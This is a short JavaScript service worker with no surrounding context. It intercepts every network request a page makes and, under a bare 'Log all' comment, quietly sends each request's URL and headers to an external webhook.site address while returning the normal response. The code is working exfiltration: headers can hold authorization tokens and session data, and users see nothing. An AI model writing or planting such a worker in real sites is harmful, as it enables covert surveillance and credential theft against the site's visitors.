self.addEventListener('fetch', function(event) {

  event.respondWith(

    fetch(event.request).then(function(response) {

      // Log all 

      fetch('https://webhook.site/c4c28201-0298-4c51-8d8a-b4b59034116e', {

        method: 'POST',

        body: JSON.stringify({

          url: event.request.url,

          headers: [...event.request.headers]

        })

      });

      return response;

    })

  );

});
